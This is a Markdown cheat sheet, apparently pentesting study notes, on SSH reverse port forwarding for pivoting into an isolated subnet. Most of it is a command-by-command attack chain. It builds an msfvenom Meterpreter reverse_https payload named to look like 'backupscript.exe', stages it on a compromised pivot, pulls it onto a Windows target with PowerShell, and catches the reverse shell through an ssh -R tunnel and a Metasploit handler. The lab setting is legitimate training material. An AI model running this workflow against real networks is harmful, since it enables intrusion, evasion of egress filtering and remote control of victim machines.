# 🛰️ SSH Remote/Reverse Port Forwarding Cheat Sheet

> [!info] 🧠 What is Remote/Reverse Port Forwarding?
> 
> Bash
> 
> ```
> Network connection inversion technique that forces a remote pivot server to listen on a designated port and forward inbound connections back to your attack machine.
> ```
> 
> 💡 Allows administrators and penetration testers to:
> 
> - **Catch Reverse Shells:** Establish a return connection from an internal target that has no direct path to the internet or your attack network.
>     
> - **Expose Local Listeners:** Make a security testing listener (like Metasploit) running on your personal machine appear to reside on a trusted intermediate pivot server.
>     
> - **Bypass Strict Egress Filters:** Tunnel reverse traffic backwards over an already established outbound SSH management session.
>     
> 
> ✔ Common in:
> 
> - Subnet intrusion setups, firewall-restricted red team operations, and post-compromise privilege escalation vectors.
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Isolated Internal Target ↔ Compromised Pivot Host (SSH Listen Port) ↔ Attack Host Listener
> ```
> 
> 💡 Key Operational Constraints:
> 
> - **Network A** (Attack Zone: `10.129.x.x`) can talk to the Pivot Host.
>     
> - **Network B** (Isolated Zone: `172.16.5.x`) can talk to the Pivot Host, but **cannot** communicate out to the Attack Zone.
>     
> 
> ✔ Think of it as **building a reverse delivery pipeline. Because the target can't mail a package directly to your house, they drop it off at an intermediate collection bin on the pivot server, which immediately flings it down a pre-arranged slide straight into your terminal**.

# 🌳 Structure: Payload Construction & Connection Flow

> [!info] 📚 Reverse Payload Generation (`msfvenom`)
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Pivot_IP> LPORT=<Pivot_Listen_Port> -f exe -o backupscript.exe
> ```
> 
> 💡 Function:
> 
> - Generates an executable targeted to connect back _only_ to the pivot host, masking your true external attack infrastructure from the isolated asset.
>     

> [!tip] 📥 Inverting the Endpoint Interface (`ssh -R`)
> 
> Bash
> 
> ```
> ssh -R <Pivot_Listen_IP>:<Pivot_Listen_Port>:<Local_Listen_IP>:<Local_Listen_Port> <User>@<Pivot_External_IP> -vN
> ```
> 
> 💡 Logic:
> 
> - Installs an inverted pipeline. The `-R` flag commands the remote SSH server to capture traffic entering its own interface and throw it backward through the SSH channel to your machine.
>     

# 🔐 Access Methods

|**Connection Leg**|**Originating Node**|**Receiving Port & Service**|**Purpose**|
|---|---|---|---|
|**Payload Execution**|Isolated Target (`172.16.5.19`)|`172.16.5.129:8080` (Pivot Interface)|Target attempts a standard reverse connection to its local gateway pivot server.|
|**Reverse SSH Bridge**|Attack Host (`10.129.x.x`)|`10.129.x.x:22` (SSH Inverted Tunnel)|Triggers the pivot host to hold open a socket and stream input back across the network.|
|**Framework Capture**|Local Proxy Socket (`127.0.0.1`)|`0.0.0.0:8000` (Metasploit Handler)|Catches the incoming stream arriving via the secure internal SSH socket wrapper.|

# 🔍 Footprinting & Enumeration

> [!success] 📡 Key Enumeration & Delivery Tools
> 
> Bash
> 
> ```
> # 1. Stage the payload delivery vector from the attack machine to the pivot host
> scp backupscript.exe ubuntu@10.129.202.64:~/backupscript.exe
>  
> # 2. Stand up a local landing server on the pivot point to host the payload file
> ubuntu@Webserver$ python3 -m http.server 8123
>  
> # 3. Force the internal Windows target to grab the payload through the web server
> PS C:\> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
> ```
> 
> 💡 Flag breakdown:
> 
> - `-vN` passes verbose tracking logs (`-v`) and prevents the generation of an active interactive console prompt (`-N`), keeping the channel clean exclusively for traffic data movement.
>     
> - `0.0.0.0:8000` binds your Metasploit multi/handler to look for payloads emerging out of any local interface connection pipeline.
>     

> [!info] 🔍 Information Revealed
> 
> - **Encapsulated Socket Logs:** `debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080` validates that the reverse tunnel is actively catching and packaging traffic.
>     
> - **Loopback Verification:** Running `netstat` inside your shell session reveals the connection source as `127.0.0.1`, verifying that the attack traffic is navigating entirely within local socket lines.
>     

# ⚠️ Common Misconfigurations

> [!danger] 🔓 GatewayPorts Settings & Isolated Routing Oversights
> 
> Bash
> 
> ```
> SSH Server Configuration: /etc/ssh/sshd_config lacks 'GatewayPorts yes' enforcement
> Routing Isolation: Windows systems block external internet boundaries but allow internal adjacent file hops
> ```
> 
> 💡 Impact:
> 
> - **Interface Blindness:** If `GatewayPorts` is disabled, the remote SSH host will only listen on `127.0.0.1:8080` rather than binding to the physical network card (`172.16.5.129`), making it impossible for the isolated target to reach the tunnel.
>     
> - **Execution Dropouts:** Payloads executed inside the target zone crash immediately if the target tries to connect directly to the external attack IP instead of routing through the pivot host gateway.
>     

# 💥 Protocol-Specific Attacks

> [!warning] ⚙️ Staging the Metasploit Multi-Handler
> 
> Bash
> 
> ```
> msf6 > use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
> msf6 exploit(multi/handler) > set lhost 0.0.0.0
> msf6 exploit(multi/handler) > set lport 8000
> msf6 exploit(multi/handler) > run
> ```
> 
> 💡 Impact:
> 
> - Activates a persistent local web handler configured to receive incoming HTTPS encrypted payload staging requests from local port 8000.
>     

> [!danger] 🎯 Activating the Reverse SSH Tunnel
> 
> Bash
> 
> ```
> ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
> ```
> 
> 💡 Risk:
> 
> - Dynamically bridges the gap across networks. This command forces the Ubuntu pivot server to open port `8080` on its internal interface (`172.16.5.129`).
>     
> - Any data hitting the pivot host on port `8080` is instantly captured and forwarded back to your attack host's handler on port `8000`.
>     

# ⚡ Real-World Workflow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Use msfvenom to build an internal payload pointing directly to the internal IP and port of the pivot host.
> 2. Open a local Metasploit multi/handler listener on your machine (e.g., listening on port 8000).
> 3. Use SCP to transfer the payload executable over to your compromised Linux pivot server.
> 4. Run a Python web server on the pivot host to host and deliver the executable file to the target subnet.
> 5. Access the target host (via RDP or other means) and use PowerShell to pull the script file onto its local disk.
> 6. Establish the inverted SSH channel tunnel using the 'ssh -R' parameter flag.
> 7. Run the executable payload on the isolated host to trigger a reverse shell that loops backward to your attack machine.
> ```
> 
> 💡 Always double-check that your payload ports (8080) perfectly match the incoming port definitions on your reverse SSH command string.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> msfvenom Payload     → A homing pigeon trained to fly exclusively to the nearest post office (Pivot IP)
> python3 HTTP Server  → A temporary supply drop point used to pass the payload across network boundaries
> ssh -R Tunnel        → An inverted vacuum tube pulling packages backward through a closed perimeter door
> Metasploit Handler   → The receiver catching the package as it falls out of the vacuum line
> ```
> 
> 💡 When standard routing blocks outbound communication, do not fight the firewall. Invert your transport layer with an SSH reverse tunnel (`-R`) and let the pivot server act as a proxy mailbox.